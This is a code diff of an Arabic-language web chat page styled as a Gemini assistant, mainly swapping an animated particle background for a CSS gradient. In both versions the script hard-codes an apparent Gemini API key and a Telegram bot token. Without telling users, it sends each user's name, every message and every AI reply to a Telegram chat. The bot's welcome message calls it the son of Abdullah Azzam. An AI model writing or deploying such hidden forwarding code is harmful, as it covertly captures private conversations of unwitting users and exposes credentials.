@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gemini AI Chat - Dynamic Background</title>
+    <title>Gemini AI Chat - Redesigned</title>
     
     <!-- Tailwind CSS for modern styling -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -18,20 +18,32 @@
         body {
             font-family: 'Cairo', sans-serif;
             background-color: #0c0a09; /* stone-950 */
-            overflow: hidden; /* Prevent scrollbars from canvas */
         }
         
-        /* Canvas is positioned behind all content */
-        #particle-canvas {
+        /* Animated Gradient Background */
+        body::before {
+            content: '';
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background: radial-gradient(circle at 10% 20%, rgba(124, 58, 237, 0.2), transparent 40%),
+                        radial-gradient(circle at 90% 80%, rgba(29, 78, 216, 0.2), transparent 40%);
             z-index: -1;
+            animation: move-glow 20s infinite alternate;
         }
 
-        /* Custom scrollbar for the chat container */
+        @keyframes move-glow {
+            from {
+                transform: translate(0, 0) scale(1);
+            }
+            to {
+                transform: translate(20px, 40px) scale(1.2);
+            }
+        }
+
+        /* Custom scrollbar for a cleaner look */
         #chat-container::-webkit-scrollbar {
             width: 6px;
         }
@@ -96,9 +108,6 @@
 </head>
 <body class="text-gray-200 flex flex-col h-screen">
 
-    <!-- Interactive Particle Background -->
-    <canvas id="particle-canvas"></canvas>
-
     <!-- Name Entry Modal -->
     <div id="name-modal-overlay" class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 transition-opacity duration-500 opacity-0">
         <div id="name-modal" class="bg-stone-900/80 border border-stone-700 p-8 rounded-2xl shadow-2xl shadow-indigo-500/10 w-11/12 max-w-sm">
@@ -152,15 +161,19 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // --- Elements and Configs from original script ---
-            const geminiApiKey = "AIzaSyDbJBid_qL5Nq9VuYX7zMi5ZrNSjKBD2Us";
+            // --- Gemini API Configuration ---
+            const geminiApiKey = "AIzaSyDbJBid_qL5Nq9VuYX7zMi5ZrNSjKBD2Us"; // WARNING: Insecure in production
             const geminiModel = "gemini-2.0-flash";
             const proxy = "https://corsproxy.io/?";
             const geminiApiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${geminiModel}:generateContent?key=${geminiApiKey}`;
             const geminiFullURL = proxy + encodeURIComponent(geminiApiUrl);
+
+            // --- Telegram Bot Configuration ---
             const telegramBotToken = "7013070687:AAGx6SXZ5w_RWJ2c9baHZwrBY7UvbMTzgds";
             const telegramChatId = "6731832374";
             const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            // --- DOM Elements ---
             const nameModalOverlay = document.getElementById('name-modal-overlay');
             const nameModal = document.getElementById('name-modal');
             const nameForm = document.getElementById('name-form');
@@ -171,150 +184,99 @@
             const sendButton = document.getElementById('send-button');
             const typingIndicator = document.getElementById('typing-indicator-container');
             const welcomeContainer = document.getElementById('welcome-message-container');
+            
             let userName = '';
 
-            // --- Particle Background Logic ---
-            const canvas = document.getElementById('particle-canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            let particlesArray;
-
-            const mouse = { x: null, y: null, radius: (canvas.height/100) * (canvas.width/100) };
-            window.addEventListener('mousemove', (event) => { mouse.x = event.x; mouse.y = event.y; });
-            window.addEventListener('mouseout', () => { mouse.x = null; mouse.y = null; });
-            window.addEventListener('resize', () => {
-                canvas.width = innerWidth;
-                canvas.height = innerHeight;
-                mouse.radius = (canvas.height/100) * (canvas.width/100);
-                initParticles();
-            });
-
-            class Particle {
-                constructor(x, y, directionX, directionY, size, color) {
-                    this.x = x; this.y = y; this.directionX = directionX; this.directionY = directionY; this.size = size; this.color = color;
-                }
-                draw() {
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2, false);
-                    ctx.fillStyle = this.color;
-                    ctx.fill();
-                }
-                update() {
-                    if (this.x > canvas.width || this.x < 0) { this.directionX = -this.directionX; }
-                    if (this.y > canvas.height || this.y < 0) { this.directionY = -this.directionY; }
-                    this.x += this.directionX;
-                    this.y += this.directionY;
-                    this.draw();
-                }
-            }
-
-            function initParticles() {
-                particlesArray = [];
-                let numberOfParticles = (canvas.height * canvas.width) / 9000;
-                for (let i = 0; i < numberOfParticles; i++) {
-                    let size = (Math.random() * 2.5) + 1;
-                    let x = (Math.random() * ((innerWidth - size * 2) - (size * 2)) + size * 2);
-                    let y = (Math.random() * ((innerHeight - size * 2) - (size * 2)) + size * 2);
-                    let directionX = (Math.random() * 0.4) - 0.2;
-                    let directionY = (Math.random() * 0.4) - 0.2;
-                    let color = 'rgba(167, 139, 250, 0.6)'; // violet-400 with opacity
-                    particlesArray.push(new Particle(x, y, directionX, directionY, size, color));
-                }
-            }
-
-            function connectParticles() {
-                let opacityValue = 1;
-                for (let a = 0; a < particlesArray.length; a++) {
-                    for (let b = a; b < particlesArray.length; b++) {
-                        let distance = ((particlesArray[a].x - particlesArray[b].x) * (particlesArray[a].x - particlesArray[b].x))
-                                     + ((particlesArray[a].y - particlesArray[b].y) * (particlesArray[a].y - particlesArray[b].y));
-                        if (distance < (canvas.width/8) * (canvas.height/8)) {
-                            opacityValue = 1 - (distance/20000);
-                            
-                            // Make lines more visible near mouse
-                            let dx = mouse.x - particlesArray[a].x;
-                            let dy = mouse.y - particlesArray[a].y;
-                            let mouseDistance = Math.sqrt(dx*dx + dy*dy);
-                            if (mouseDistance < mouse.radius){
-                                opacityValue = 1 - (distance/10000);
-                                ctx.strokeStyle = `rgba(199, 210, 254, ${opacityValue})`; // indigo-200
-                            } else {
-                                ctx.strokeStyle = `rgba(99, 102, 241, ${opacityValue})`; // indigo-500
-                            }
-
-                            ctx.lineWidth = 1;
-                            ctx.beginPath();
-                            ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
-                            ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
-                            ctx.stroke();
-                        }
-                    }
-                }
-            }
+            // --- Event Listeners ---
             
-            function animateParticles() {
-                requestAnimationFrame(animateParticles);
-                ctx.clearRect(0,0,innerWidth, innerHeight);
-                for (let i = 0; i < particlesArray.length; i++) {
-                    particlesArray[i].update();
-                }
-                connectParticles();
-            }
-
-            initParticles();
-            animateParticles();
-
-            // --- Original Chat Functions ---
+            // Handle name submission
             nameForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 const name = nameInput.value.trim();
                 if (name) {
                     userName = name;
-                    sendMessageToTelegram(`👋 مستخدم جديد بدأ المحادثة:\n\nالاسم: ${name}`);
+                    const loginMessage = `👋 مستخدم جديد بدأ المحادثة:\n\nالاسم: ${name}`;
+                    sendMessageToTelegram(loginMessage);
                     hideNameModal();
                     displayWelcomeMessage(userName);
                 }
             });
 
+            // Handle chat message submission
             chatForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 const message = userInput.value.trim();
                 if (message) {
                     addMessageToChat('user', message);
-                    sendMessageToTelegram(`👤 رسالة من (${userName}):\n\n${message}`);
+                    const userMessage = `👤 رسالة من (${userName}):\n\n${message}`;
+                    sendMessageToTelegram(userMessage);
                     userInput.value = '';
                     fetchGeminiResponse(message);
                 }
             });
+
+            // --- Functions ---
             
             async function sendMessageToTelegram(messageText) {
                 try {
                     await fetch(telegramApiUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: telegramChatId, text: messageText, parse_mode: "Markdown" })
+                        body: JSON.stringify({
+                            chat_id: telegramChatId,
+                            text: messageText,
+                            parse_mode: "Markdown"
+                        })
                     });
-                } catch (error) { console.error('Failed to send message to Telegram:', error); }
+                } catch (error) {
+                    console.error('Failed to send message to Telegram:', error);
+                }
             }
 
             function hideNameModal() {
                 nameModalOverlay.style.opacity = '0';
-                setTimeout(() => { nameModalOverlay.classList.add('hidden'); }, 500);
+                setTimeout(() => {
+                    nameModalOverlay.classList.add('hidden');
+                }, 500); // Match duration of transition
             }
             
             function displayWelcomeMessage(name) {
-                const welcomeHTML = `<div class="flex items-end gap-3 chat-message"><div class="bg-gradient-to-br from-indigo-500 to-purple-600 p-2.5 rounded-full flex-shrink-0 shadow-lg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles text-indigo-100"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg></div><div class="bg-stone-800 border border-stone-700 rounded-xl rounded-bl-none p-4 max-w-lg shadow-md"><p class="text-base">أهلاً بك يا ${escapeHTML(name)}! أنا SATA إبن عبدالله عزام، أزاي اقدر اساعدك؟</p></div></div>`;
+                const welcomeHTML = `
+                    <div class="flex items-end gap-3 chat-message">
+                         <div class="bg-gradient-to-br from-indigo-500 to-purple-600 p-2.5 rounded-full flex-shrink-0 shadow-lg">
+                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles text-indigo-100"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>
+                        </div>
+                        <div class="bg-stone-800 border border-stone-700 rounded-xl rounded-bl-none p-4 max-w-lg shadow-md">
+                            <p class="text-base">أهلاً بك يا ${escapeHTML(name)}! أنا SATA إبن عبدالله عزام، أزاي اقدر اساعدك؟</p>
+                        </div>
+                    </div>
+                `;
                 welcomeContainer.innerHTML = welcomeHTML;
             }
 
             function addMessageToChat(sender, message) {
                 const messageWrapper = document.createElement('div');
                 messageWrapper.className = 'chat-message';
+
                 if (sender === 'user') {
-                    messageWrapper.innerHTML = `<div class="flex items-start gap-3 justify-end"><div class="bg-gradient-to-br from-blue-600 to-cyan-600 rounded-xl rounded-br-none p-4 max-w-lg shadow-md"><p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p></div></div>`;
-                } else {
-                    messageWrapper.innerHTML = `<div class="flex items-end gap-3"><div class="bg-gradient-to-br from-indigo-500 to-purple-600 p-2.5 rounded-full flex-shrink-0 shadow-lg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles text-indigo-100"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg></div><div class="bg-stone-800 border border-stone-700 rounded-xl rounded-bl-none p-4 max-w-lg shadow-md"><p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p></div></div>`;
+                    messageWrapper.innerHTML = `
+                        <div class="flex items-start gap-3 justify-end">
+                            <div class="bg-gradient-to-br from-blue-600 to-cyan-600 rounded-xl rounded-br-none p-4 max-w-lg shadow-md">
+                                <p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p>
+                            </div>
+                        </div>
+                    `;
+                } else { // AI
+                    messageWrapper.innerHTML = `
+                        <div class="flex items-end gap-3">
+                            <div class="bg-gradient-to-br from-indigo-500 to-purple-600 p-2.5 rounded-full flex-shrink-0 shadow-lg">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles text-indigo-100"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>
+                            </div>
+                            <div class="bg-stone-800 border border-stone-700 rounded-xl rounded-bl-none p-4 max-w-lg shadow-md">
+                                <p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p>
+                            </div>
+                        </div>
+                    `;
                 }
                 chatContainer.appendChild(messageWrapper);
                 scrollToBottom();
@@ -322,17 +284,31 @@
             
             async function fetchGeminiResponse(userInputText) {
                 toggleLoadingState(true);
-                const body = { contents: [{ parts: [{ text: userInputText }] }] };
+
+                const body = {
+                    contents: [{ parts: [{ text: userInputText }] }]
+                };
+
                 try {
-                    const res = await fetch(geminiFullURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+                    const res = await fetch(geminiFullURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(body)
+                    });
+
                     if (!res.ok) throw new Error(`API Error: ${res.status}`);
+
                     const data = await res.json();
                     const reply = data?.candidates?.[0]?.content?.parts?.[0]?.text || "عفواً، لم أتمكن من معالجة الطلب. حاول مرة أخرى.";
+                    
                     addMessageToChat('ai', reply);
-                    sendMessageToTelegram(`🤖 رد من Gemini على (${userName}):\n\n${reply}`);
+                    const aiMessage = `🤖 رد من Gemini على (${userName}):\n\n${reply}`;
+                    sendMessageToTelegram(aiMessage);
+
                 } catch (err) {
                     console.error("Failed to connect to Gemini:", err);
-                    addMessageToChat('ai', "حدث خطأ أثناء الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.");
+                    const errorMessage = "حدث خطأ أثناء الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.";
+                    addMessageToChat('ai', errorMessage);
                 } finally {
                     toggleLoadingState(false);
                 }
@@ -340,13 +316,25 @@
             
             function toggleLoadingState(isLoading) {
                 sendButton.disabled = isLoading;
-                typingIndicator.classList.toggle('hidden', !isLoading);
-                if (isLoading) scrollToBottom();
+                if (isLoading) {
+                    typingIndicator.classList.remove('hidden');
+                    scrollToBottom();
+                } else {
+                    typingIndicator.classList.add('hidden');
+                }
             }
 
-            function scrollToBottom() { chatContainer.scrollTop = chatContainer.scrollHeight; }
-            function escapeHTML(str) { const p = document.createElement('p'); p.textContent = str; return p.innerHTML; }
+            function scrollToBottom() {
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }
             
+            function escapeHTML(str) {
+                const p = document.createElement('p');
+                p.appendChild(document.createTextNode(str));
+                return p.innerHTML;
+            }
+            
+            // Show the modal on page load with animation
             setTimeout(() => {
                  nameModalOverlay.style.opacity = '1';
                  nameModalOverlay.classList.add('visible');
